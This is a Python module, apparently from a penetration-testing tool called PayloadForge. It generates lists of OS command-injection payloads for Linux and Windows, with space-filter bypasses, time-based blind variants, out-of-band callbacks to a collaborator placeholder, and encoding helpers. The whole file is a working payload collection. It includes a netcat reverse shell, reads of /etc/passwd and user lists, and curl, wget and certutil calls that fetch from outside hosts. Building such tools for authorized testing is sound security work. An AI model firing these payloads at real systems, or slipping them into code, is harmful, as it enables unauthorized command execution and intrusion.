"""
PayloadForge Command Injection Payload Generator

⚠️  ETHICAL USE ONLY ⚠️

This module generates Command Injection payloads for authorized security
testing and educational purposes only. Never use these payloads against
systems without explicit written permission.

Platform Support:
- Linux/Unix
- Windows

IMPORTANT: This module generates payload strings ONLY.
It does NOT execute any commands on any system.
"""

from typing import List, Optional, Dict
from payloadforge.logger import logger


class CMDiGenerator:
    """
    Command Injection Payload Generator for ethical security testing.
    
    ⚠️ FOR AUTHORIZED TESTING ONLY ⚠️
    ⚠️ GENERATION ONLY - NO EXECUTION ⚠️
    """
    
    # Linux command injection payloads
    LINUX_PAYLOADS = [
        "; id",
        "| id",
        "|| id",
        "&& id",
        "& id",
        "`id`",
        "$(id)",
        "; whoami",
        "| whoami",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; ls -la",
        "| ls -la",
        "; uname -a",
        "$(whoami)",
        "`whoami`",
        "\n id",
        "\r\n id",
        "| sleep 5",
        "; sleep 5",
        "&& sleep 5",
        "|| sleep 5",
        "$(sleep 5)",
        "`sleep 5`",
        "; ping -c 5 127.0.0.1",
        "| nc -e /bin/sh 127.0.0.1 4444",
        "; curl http://example.com",
        "| wget http://example.com",
    ]
    
    # Linux with spaces bypassed
    LINUX_NO_SPACES = [
        ";{id}",
        ";{cat,/etc/passwd}",
        ";cat${IFS}/etc/passwd",
        ";cat$IFS/etc/passwd",
        ";{ls,-la}",
        "$(cat</etc/passwd)",
        ";id|base64",
        ";$(echo${IFS}id)",
    ]
    
    # Windows command injection payloads
    WINDOWS_PAYLOADS = [
        "& whoami",
        "| whoami",
        "|| whoami",
        "&& whoami",
        "| dir",
        "& dir",
        "&& dir",
        "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "& net user",
        "| net user",
        "& ipconfig",
        "| ipconfig",
        "& systeminfo",
        "| systeminfo",
        "& hostname",
        "| hostname",
        "& ping -n 5 127.0.0.1",
        "| ping -n 5 127.0.0.1",
        "&& ping -n 5 127.0.0.1",
        "& tasklist",
        "| tasklist",
        "& ver",
        "| ver",
        "& echo %username%",
        "| echo %username%",
        "& certutil -urlcache -split -f http://example.com/file.txt",
    ]
    
    # Blind command injection (time-based)
    BLIND_PAYLOADS: Dict[str, List[str]] = {
        "linux": [
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
            "|| sleep 5",
            "$(sleep 5)",
            "`sleep 5`",
            "; sleep 5 #",
            "| sleep 5 #",
            "; ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
        ],
        "windows": [
            "& ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
            "&& ping -n 5 127.0.0.1",
            "|| ping -n 5 127.0.0.1",
            "& timeout 5",
            "| timeout 5",
            "&& timeout 5",
            "|| timeout 5",
        ],
    }
    
    # Out-of-band payloads (for detecting blind injection)
    OOB_PAYLOADS: Dict[str, List[str]] = {
        "linux": [
            "; curl http://BURP_COLLABORATOR",
            "| curl http://BURP_COLLABORATOR",
            "; wget http://BURP_COLLABORATOR",
            "| wget http://BURP_COLLABORATOR",
            "$(curl http://BURP_COLLABORATOR)",
            "`curl http://BURP_COLLABORATOR`",
            "; nslookup BURP_COLLABORATOR",
            "| nslookup BURP_COLLABORATOR",
            "; dig BURP_COLLABORATOR",
            "| dig BURP_COLLABORATOR",
        ],
        "windows": [
            "& nslookup BURP_COLLABORATOR",
            "| nslookup BURP_COLLABORATOR",
            "&& nslookup BURP_COLLABORATOR",
            "& certutil -urlcache -split -f http://BURP_COLLABORATOR",
            "| certutil -urlcache -split -f http://BURP_COLLABORATOR",
            "& ping BURP_COLLABORATOR",
            "| ping BURP_COLLABORATOR",
        ],
    }
    
    @classmethod
    def generate_linux(cls, count: Optional[int] = None) -> List[str]:
        """
        Generate Linux command injection payloads.
        
        Args:
            count: Number of payloads to return. If None, returns all.
            
        Returns:
            List of Linux command injection payload strings.
        """
        logger.log_cmdi("linux")
        payloads = cls.LINUX_PAYLOADS
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_linux_no_spaces(cls, count: Optional[int] = None) -> List[str]:
        """
        Generate Linux command injection payloads with space bypasses.
        
        Args:
            count: Number of payloads to return. If None, returns all.
            
        Returns:
            List of Linux command injection payload strings without spaces.
        """
        logger.log_cmdi("linux_no_spaces")
        payloads = cls.LINUX_NO_SPACES
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_windows(cls, count: Optional[int] = None) -> List[str]:
        """
        Generate Windows command injection payloads.
        
        Args:
            count: Number of payloads to return. If None, returns all.
            
        Returns:
            List of Windows command injection payload strings.
        """
        logger.log_cmdi("windows")
        payloads = cls.WINDOWS_PAYLOADS
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_blind(cls, os_type: str = "linux", count: Optional[int] = None) -> List[str]:
        """
        Generate blind command injection payloads (time-based).
        
        Args:
            os_type: Operating system type ('linux' or 'windows').
            count: Number of payloads to return. If None, returns all.
            
        Returns:
            List of blind command injection payload strings.
        """
        logger.log_cmdi(f"{os_type}_blind")
        os_type = os_type.lower()
        if os_type not in cls.BLIND_PAYLOADS:
            os_type = "linux"
        
        payloads = cls.BLIND_PAYLOADS[os_type]
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_oob(
        cls, os_type: str = "linux", 
        collaborator: str = "BURP_COLLABORATOR",
        count: Optional[int] = None
    ) -> List[str]:
        """
        Generate out-of-band command injection payloads.
        
        Args:
            os_type: Operating system type ('linux' or 'windows').
            collaborator: Collaborator URL placeholder to replace.
            count: Number of payloads to return. If None, returns all.
            
        Returns:
            List of OOB command injection payload strings.
        """
        logger.log_cmdi(f"{os_type}_oob")
        os_type = os_type.lower()
        if os_type not in cls.OOB_PAYLOADS:
            os_type = "linux"
        
        payloads = [p.replace("BURP_COLLABORATOR", collaborator) 
                    for p in cls.OOB_PAYLOADS[os_type]]
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_all(cls, os_type: str = "linux") -> dict:
        """
        Generate all command injection payloads for a specific OS.
        
        Args:
            os_type: Operating system type ('linux' or 'windows').
            
        Returns:
            Dictionary with payload categories as keys.
        """
        if os_type.lower() == "windows":
            return {
                "basic": cls.generate_windows(),
                "blind": cls.generate_blind("windows"),
                "oob": cls.generate_oob("windows"),
            }
        else:
            return {
                "basic": cls.generate_linux(),
                "no_spaces": cls.generate_linux_no_spaces(),
                "blind": cls.generate_blind("linux"),
                "oob": cls.generate_oob("linux"),
            }
    
    @classmethod
    def with_encoding(cls, payloads: List[str], encoding: str) -> List[str]:
        """
        Apply encoding to command injection payloads.
        
        Args:
            payloads: List of payloads to encode.
            encoding: Encoding type ('url', 'base64', 'unicode').
            
        Returns:
            List of encoded payloads.
        """
        from payloadforge.encoders import url, base64_enc, unicode as unicode_enc
        
        encoded = []
        for payload in payloads:
            if encoding == "url":
                encoded.append(url.encode(payload))
            elif encoding == "base64":
                encoded.append(base64_enc.encode(payload))
            elif encoding == "unicode":
                encoded.append(unicode_enc.encode_escape(payload))
            else:
                encoded.append(payload)
        
        return encoded


# Convenience functions
def generate_linux(count: Optional[int] = None) -> List[str]:
    """Generate Linux command injection payloads."""
    return CMDiGenerator.generate_linux(count)


def generate_windows(count: Optional[int] = None) -> List[str]:
    """Generate Windows command injection payloads."""
    return CMDiGenerator.generate_windows(count)


def generate_blind(os_type: str = "linux", count: Optional[int] = None) -> List[str]:
    """Generate blind command injection payloads."""
    return CMDiGenerator.generate_blind(os_type, count)


def generate_all(os_type: str = "linux") -> dict:
    """Generate all command injection payloads."""
    return CMDiGenerator.generate_all(os_type)
